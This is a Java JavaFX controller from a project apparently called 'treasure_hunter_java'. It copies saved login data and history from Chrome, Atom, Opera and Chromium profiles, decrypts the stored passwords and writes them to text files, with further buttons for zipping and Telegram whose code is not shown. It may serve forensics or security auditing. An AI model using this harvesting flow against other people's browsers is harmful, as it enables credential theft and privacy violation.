package com.treasure_hunter_java.controllers;

import com.treasure_hunter_java.Main;
import com.treasure_hunter_java.decrypt.CopyFiles;
import com.treasure_hunter_java.decrypt.Decrypt;
import com.treasure_hunter_java.browsers.*;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;
import java.util.ArrayList;

public class MainController extends Controller {

    @FXML
    private CheckBox passwordsGoogle;

    @FXML
    private CheckBox historyGoogle;

    @FXML
    private CheckBox passwordsAtom;

    @FXML
    private CheckBox historyAtom;

    @FXML
    private CheckBox passwordsOpera;

    @FXML
    private CheckBox historyOpera;

    @FXML
    private CheckBox passwordsChromium;

    @FXML
    private CheckBox historyChromium;

    private void writeData(String text, String dataName, String browserDirectory) throws IOException {

        File file = new File(Main.mainWorkDirectory + browserDirectory + dataName);

        try (FileWriter fw = new FileWriter(file);
             BufferedWriter bw = new BufferedWriter(fw))
        {
            bw.write(text);
        }

    }
    private void getGoogleData(CopyFiles copyFiles) throws Exception {

        Chrome chrome = new Chrome();
        chrome.collectProfiles();
        String browserName = "/chrome_data/";

        test(copyFiles, browserName, passwordsGoogle, chrome.getProfiles(), chrome.getLocalState(), historyGoogle);
    }

    private void test(CopyFiles copyFiles, String browserName, CheckBox passwords, ArrayList<Path> profiles,
                      Path localState, CheckBox history) throws Exception {
        if (passwords.isSelected()){
            copyFiles.copyLoginData(profiles, localState, browserName);
            writeData(Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName),
                    "passwords.txt", browserName);
        }

        if (history.isSelected()){
            copyFiles.copyHistory(profiles, browserName);
            writeData(Decrypt.getHistory(Main.mainWorkDirectory.toString() + browserName + "History"),
                    "history.txt", browserName);
        }
    }

    private void getAtomData(CopyFiles copyFiles) throws Exception {

        Atom atom = new Atom();
        atom.collectProfiles();
        String browserName = "/atom_data/";

        test(copyFiles, browserName, passwordsAtom, atom.getProfiles(), atom.getLocalState(), historyAtom);
    }

    private void getOperaData(CopyFiles copyFiles) throws Exception {

        Opera opera = new Opera();
        opera.collectProfiles();
        String browserName = "/opera_data/";

        test(copyFiles, browserName, passwordsOpera, opera.getProfiles(), opera.getLocalState(), historyOpera);
    }

    private void getChromiumData(CopyFiles copyFiles) throws Exception {

        Chromium chromium = new Chromium();
        chromium.collectProfiles();
        String browserName = "/chromium_data/";

        test(copyFiles, browserName, passwordsChromium, chromium.getProfiles(), chromium.getLocalState(), historyChromium);
    }

    @Override
    @FXML
    protected void onSearchPasswordsButtonClick() throws IOException {
        super.onSearchPasswordsButtonClick();
    }

    @Override
    @FXML
    protected void onGenerateDictionaryButtonClick() throws IOException {
        super.onGenerateDictionaryButtonClick();
    }

    @Override
    @FXML
    protected void onReportButtonClick() throws IOException {
        super.onReportButtonClick();
    }

    @Override
    @FXML
    protected void onZipButtonClick() throws IOException {
        super.onZipButtonClick();
    }

    @Override
    @FXML
    protected void onTelegramButtonClick() throws IOException {
        super.onTelegramButtonClick();
    }

    @Override
    @FXML
    protected void onSelectDirectoryButtonClick() {
        super.onSelectDirectoryButtonClick();
    }

    @FXML
    protected void onStartButtonClick() throws Exception {

        getGoogleData(new CopyFiles());
        getAtomData(new CopyFiles());
        getOperaData(new CopyFiles());
        getChromiumData(new CopyFiles());
    }
}